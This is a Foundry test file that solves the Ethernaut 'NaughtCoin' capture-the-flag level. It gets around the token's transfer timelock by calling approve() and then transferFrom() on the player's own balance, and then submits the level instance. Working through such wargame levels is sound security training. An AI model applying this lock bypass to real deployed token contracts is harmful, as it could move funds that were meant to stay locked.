// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

// there are no modifiers on the methods approve or transferFrom
interface INaughtCoin {
  function balanceOf(address account) external returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns(bool);
}

contract NaughtCoinTest is Test {
  address internal challengeAddress;
  INaughtCoin internal nc;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F);
    nc = INaughtCoin(challengeAddress);
  }

  function testExploit() public {
    uint256 balance = nc.balanceOf(address(this));

    nc.approve(address(this), balance);
    nc.transferFrom(address(this), tx.origin, balance);

    utils.submitLevelInstance(challengeAddress);
  }
}
